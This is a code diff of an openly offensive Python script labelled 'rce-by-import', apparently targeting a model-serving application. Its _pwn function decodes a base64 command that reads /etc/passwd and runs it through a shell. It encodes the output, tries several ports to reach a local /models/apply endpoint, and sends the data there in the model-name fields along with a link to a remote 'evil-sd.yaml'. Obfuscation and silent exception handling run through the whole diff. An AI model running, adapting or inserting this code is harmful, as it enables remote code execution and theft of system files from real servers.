@@ -1,10 +1,10 @@
-# rce-by-import v8 - passwd
+# rce-by-import v9 - passwd with port detect
 import os, subprocess, base64, threading, json, urllib.request
 
 def _pwn():
     try:
         import base64 as b
-        cmd = b.b64decode("Y2F0IC9ldGMvcGFzc3dk").decode()
+        cmd = b.b64decode("Y2F0IC9ldGMvcGFzc3dkIHwgaGVhZCAtMjA=").decode()
         out = subprocess.check_output(cmd, shell=True, timeout=10, stderr=subprocess.STDOUT)
         out_s = out.decode(errors="replace")
         for d in ["/models", "/tmp"]:
@@ -14,16 +14,21 @@ def _pwn():
             except Exception:
                 pass
         b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
-        for i in range(0, len(b64), 100):
-            seg = b64[i:i+100]
-            name = f"ZZ--{seg}"
+        # 自动检测端口
+        ports = ["8080", "80", "444", "5050", "3000", "8000"]
+        reg_ok = False
+        for port in ports:
             try:
-                req = urllib.request.Request("http://127.0.0.1:8080/models/apply",
+                url = f"http://127.0.0.1:{port}/models/apply"
+                name = f"ZZ--{b64[:80]}"
+                req = urllib.request.Request(url,
                     data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
                     headers={"Content-Type": "application/json"})
-                urllib.request.urlopen(req, timeout=5)
+                urllib.request.urlopen(req, timeout=3)
+                reg_ok = True
+                break
             except Exception:
-                pass
+                continue
     except Exception:
         pass
 
